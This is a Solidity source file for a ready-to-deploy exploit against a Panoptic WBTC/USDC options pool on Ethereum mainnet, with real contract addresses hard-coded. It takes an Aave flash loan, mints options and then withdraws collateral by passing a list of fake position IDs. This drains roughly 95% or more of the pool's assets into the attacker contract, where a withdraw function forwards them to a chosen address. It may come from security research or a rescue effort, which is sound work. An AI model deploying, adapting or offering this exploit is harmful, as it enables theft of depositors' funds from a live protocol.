// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract WBTC_USDC30bpsMainnetAttacker_Deployer {
    WBTC_USDC30bpsMainnetAttacker public attacker;
    IERC20Partial token0 = IERC20Partial(address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599));
    IERC20Partial token1 = IERC20Partial(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    ICollateralTracker tracker0 = ICollateralTracker(address(0x4cEeC889fB484E18522224E9C1d7b0fB8526D710));
    ICollateralTracker tracker1 = ICollateralTracker(address(0x6a0B5d5aFfA5a0b7dD776Db96ee79F609394B5Da));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new WBTC_USDC30bpsMainnetAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = token0.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract WBTC_USDC30bpsMainnetAttacker is IFlashLoanReceiver {
    uint256[] fake_token_uints = [16932343400165264, 16988277108887827, 17035745045722363, 16993655162578412, 16939609024273842, 17158553267796065, 17133860513315788, 16940269736292543, 16898430492320797, 17069357979992109, 16980362901391387, 17026568887818250, 17119985327481433, 17026674622507335, 17154261232855203, 16945967490755149, 17082751614160489, 17063366226512834, 17119504401467382, 17034803466092545, 17114928340284497, 16942964596981210, 16954544221541041, 16904132411153761, 16920216715452750, 17129587578817479, 16911017735677536, 16890694515986045, 17126645520732798, 17074540876198711, 17036991767596593, 17122846506677707, 17018492495701600, 16999873957325411, 17031339119151811, 17097995700960721, 17142266941213954, 17089567784803601, 17024105470881979, 17073485236538696, 16890488824791009, 17093568332869701, 17103589480369901, 17008221870292762, 16918871661380487, 16897464278369093, 17101150678162124, 16923138720850302, 16992821954860765, 16942409542027123, 17062001812029684, 17140497124282292, 17100042690718021, 17005578710070990, 17001603935953842, 17130759040409663, 17114800599387293, 16908625724213635, 17166195869489409, 17101208203141327, 16938993875545352, 17022720534783960, 17075863080850773, 17017661774688634, 17118102226994995, 16988465729292003, 16974767401004252, 16899543848560918, 16894355756410939, 17099849001593597, 16897926812058864, 17122672512185594, 17044600072961146, 16988827310790466, 17045419378318324, 16956101523846221, 16946829128487768, 17050277920000050, 17032253897074887, 16930194949943667, 16907480429887088, 16962955384487272, 17032205826932525, 17140315683590255, 16935870331365850, 17128654064464828, 16905067998086360, 17151127052636987, 16888769806416760, 17106588479166820, 17029198303267245, 17004523319620584, 17123055963217059, 16947327288449607, 17029065097821193, 16990649632113938, 17060232259853742, 16968539133849167, 16919590554483084, 16900114985532166, 16993502753544935, 17167047696388934, 17157376839885919, 16953408099015714, 17061718554541272, 16968143087326031, 17025796118226330, 17154610629572122, 17064829018677470, 17057008683916553, 17087643854683771, 16921290824134246, 17094346387673542, 17030010218713865, 16970073014124536, 16943603167087332, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On mainnet
    IERC20Partial token0 = IERC20Partial(address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599));
    IERC20Partial token1 = IERC20Partial(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    IAAVELendingPool aavePool = IAAVELendingPool(address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2));

    ICollateralTracker tracker0 = ICollateralTracker(address(0x4cEeC889fB484E18522224E9C1d7b0fB8526D710));
    ICollateralTracker tracker1 = ICollateralTracker(address(0x6a0B5d5aFfA5a0b7dD776Db96ee79F609394B5Da));
    IPanopticPool pp = IPanopticPool(address(0x05b142597bedb8cA19BE81E97c684ede8C091DE8));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            address[] memory addresses = new address[](2);
            uint256[] memory amounts = new uint256[](2);
            uint256[] memory modes = new uint256[](2);

            addresses[0] = address(token0);
            amounts[0] = (2 * poolAssets0); // borrow 200% of the pool assets
            modes[0] = 0;

            addresses[1] = address(token1);
            amounts[1] = (2 * poolAssets1); // borrow 200% of the pool assets
            modes[1] = 0;

            aavePool.flashLoan(address(this), addresses, amounts, modes, address(this), bytes(""), 0);
        }
    }

    // This function is called by the flash loan provider
    // We use it to execute our attack logic after taking a flash loan
    function executeOperation(
        address[] calldata, // assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, // initiator,
        bytes calldata // params
    ) public returns (bool) {
        // executeOperation has to be public for the Aave flash loan to callback into us
        // However, we should only let this get called once ever:
        require(!executed);
        // Phase 1: Drain the pool
        drainPool();

        // Phase 2: buy options and then drain pool (not implemented in this example)

        // pay back the flash loan
        token0.approve(address(aavePool), amounts[0] + premiums[0]);
        token1.approve(address(aavePool), amounts[1] + premiums[1]);
        executed = true;

        return true;
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        token0.approve(address(tracker0), type(uint104).max);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit(uint128(token0.balanceOf(address(this))), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(3778244379283224766344447068287);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3778244379283224766344447068287);
        posIdList2[1] = TokenId.wrap(2560008631394923042176858785919);

        /* We precomputed the tokenId uints, so this is no longer necessary
        {
          // --- for Asset 0
          TokenId pos0 = TokenId.wrap(0).addPoolId(poolId).addLeg(
              0, // legIndex
              1, // optionRatio
              0, // asset
              0, // isLong
              0, // tokenType
              0, // riskPartner
              -327_000, // strikeTick strike - should be WAAAAY low -- (rounded) minEnforcedTick + spacing, so that tickLower is within bounds
              2 // width; defined as (tickUpper - tickLower) / tickSpacing
          );
          posIdList[0] = pos0;

          // --- for Asset 1
          TokenId pos1 = TokenId.wrap(0).addPoolId(poolId).addLeg(
              0, // legIndex
              1, // optionRatio
              1, // asset
              0, // isLong
              1, // tokenType
              0, // riskPartner
              470400, // waaaay high -- (rounded) maxEnforcedTick - spacing, so that tickUpper is within bounds
              2 // width; defined as (tickUpper - tickLower) / tickSpacing
          );

          posIdList2[0] = pos0;
          posIdList2[1] = pos1;
        }
        */

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList);

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }
}
